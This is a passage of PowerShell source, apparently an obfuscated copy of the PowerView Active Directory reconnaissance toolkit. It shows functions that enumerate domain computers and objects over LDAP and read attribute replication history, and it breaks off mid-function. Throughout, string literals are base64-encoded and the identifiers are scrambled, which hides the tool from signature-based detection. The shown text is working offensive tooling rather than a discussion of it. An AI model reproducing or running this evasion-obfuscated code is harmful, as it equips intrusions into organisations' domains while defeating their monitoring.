                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsAXwBfAF8ALwBcAF8ALwA9AFwALwBcAC8APQBcAC8AXAAvAH0AKQApAA==')))
                }
                else {
                    ${___/\_/=\/\/=\/\/} = [Int](${/=\____/\/===\/\_}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwA9AFwALwBcAC8AfQApAA==')))
                }
            }
            ${_________/\/==\__}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADkAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $(${_________/\/==\__}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${_________/\/==\__}.FindOne() }
            else { ${_/\__/\/=====\_/\} = ${_________/\/==\__}.FindAll() }
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                ${_/\/==\___/\/=\__} = $True
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABpAG4AZwA=')))]) {
                    ${_/\/==\___/\/=\__} = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if (${_/\/==\___/\/=\__}) {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${/\_______/\/\/=\/} = $_
                        ${/\_______/\/\/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIALgBSAGEAdwA='))))
                    }
                    else {
                        ${/\_______/\/\/=\/} = _______/==\_/=\_/= -Properties $_.Properties
                        ${/\_______/\/\/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIA'))))
                    }
                    ${/\_______/\/\/=\/}
                }
            }
            if (${_/\__/\/=====\_/\}) {
                try { ${_/\__/\/=====\_/\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${_________/\/==\__}.dispose()
        }
    }
}
function _____/\/==\/\_/=== {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${_/=\_/===\_/=\/==} = [Enum]::GetNames(${/=\____/\/===\/\_})
        ${_/=\_/===\_/=\/==} = ${_/=\_/===\_/=\/==} | % {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        _/===\_/\/\/\/==\_ -Name UACFilter -ValidateSet ${_/=\_/===\_/=\/==} -__/==\/\/=\__/=\__ ([array])
    }
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/=\/\______/\_/=\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            _/===\_/\/\/\/==\_ -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${/=\/\______/\_/=\}) {
            ${__/\_/==\_/\/\___} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${/\______/===\__/\} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQApAA==')))
                }
                elseif (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0A')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${____/\_/=\/\/\__/} = ${/\______/===\__/\}.SubString(${/\______/===\__/\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAXwBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwBcAF8AXwAvAH0AJwAgAGYAcgBvAG0AIAAnACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQAnAA==')))
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\_/=\/\/\__/}
                        ${/=\/\______/\_/=\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                        if (-not ${/=\/\______/\_/=\}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewBfAF8AXwBfAC8AXABfAC8APQBcAC8AXAAvAFwAXwBfAC8AfQAnAA==')))
                        }
                    }
                }
                elseif (${/\______/===\__/\} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${_/=\_/=====\__/=\} = (([Guid]${/\______/===\__/\}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AFwAXwAvAD0APQA9AD0APQBcAF8AXwAvAD0AXAB9ACkA')))
                }
                elseif (${/\______/===\__/\}.Contains('\')) {
                    ${/=\/\/\___/==\_/=} = ${/\______/===\__/\}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | __/\/=\_/\/=\/=\_/ -_/============\/\/ Canonical
                    if (${/=\/\/\___/==\_/=}) {
                        ${/=\/===\_/\_/=\_/} = ${/=\/\/\___/==\_/=}.SubString(0, ${/=\/\/\___/==\_/=}.IndexOf('/'))
                        ${_/\/\_/\____/\/==} = ${/\______/===\__/\}.Split('\')[1]
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAXwAvAFwALwBcAF8ALwBcAF8AXwBfAF8ALwBcAC8APQA9AH0AKQA=')))
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/=\/===\_/\_/=\_/}
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsALwA9AFwALwA9AD0APQBcAF8ALwBcAF8ALwA9AFwAXwAvAH0AJwAgAGYAcgBvAG0AIAAnACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQAnAA==')))
                        ${/=\/\______/\_/=\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                    }
                }
                elseif (${/\______/===\__/\}.Contains('.')) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKABkAG4AcwBoAG8AcwB0AG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQApAA==')))
                }
                else {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQApAA==')))
                }
            }
            if (${__/\_/==\_/\/\___} -and (${__/\_/==\_/\/\___}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8ALwBcAF8ALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | ? {$_} | % {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${_____/====\_/\__/} = $_.Substring(4)
                    ${___/\_/=\/\/=\/\/} = [Int](${/=\____/\/===\/\_}::${_____/====\_/\__/})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsAXwBfAF8ALwBcAF8ALwA9AFwALwBcAC8APQBcAC8AXAAvAH0AKQApAA==')))
                }
                else {
                    ${___/\_/=\/\/=\/\/} = [Int](${/=\____/\/===\/\_}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwA9AFwALwBcAC8AfQApAA==')))
                }
            }
            if ($Filter -and $Filter -ne '') {
                ${/=\/\______/\_/=\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACQARgBpAGwAdABlAHIAKQA=')))
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $(${/=\/\______/\_/=\}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${/=\/\______/\_/=\}.FindOne() }
            else { ${_/\__/\/=====\_/\} = ${/=\/\______/\_/=\}.FindAll() }
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQALgBSAGEAdwA='))))
                }
                else {
                    $Object = _______/==\_/=\_/= -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQA'))))
                }
                $Object
            }
            if (${_/\__/\/=====\_/\}) {
                try { ${_/\__/\/=====\_/\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${/=\/\______/\_/=\}.dispose()
        }
    }
}
function Get-DomainObjectAttributeHistory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdABhAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))] = $FindOne }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${_/\__/\_/=\__/=\_} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else {
            ${_/\__/\_/=\__/=\_} = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        _____/\/==\/\_/=== @_/\/\/\/\___/\/\/ | % {
            ${_/\_/=\____/===\/} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${___/=\_/\/\__/\_/} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdABhAA==')))]) {
                ${_/\/==\/=\___/\/=} = [xml]${___/=\_/\/\__/\_/} | select -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAEEAVABUAFIAXwBNAEUAVABBAF8ARABBAFQAQQA='))) -ErrorAction SilentlyContinue
                if (${_/\/==\/=\___/\/=}) {
                    if (${_/\/==\/=\___/\/=}.pszAttributeName -Match ${_/\__/\_/=\__/=\_}) {
                        ${/===\______/\/==\} = New-Object PSObject
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${_/\_/=\____/===\/}
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) ${_/\/==\/=\___/\/=}.pszAttributeName
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${_/\/==\/=\___/\/=}.ftimeLastOriginatingChange
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) ${_/\/==\/=\___/\/=}.dwVersion
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${_/\/==\/=\___/\/=}.pszLastOriginatingDsaDN
                        ${/===\______/\/==\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQAQQB0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                        ${/===\______/\/==\}
                    }
                }
                else {
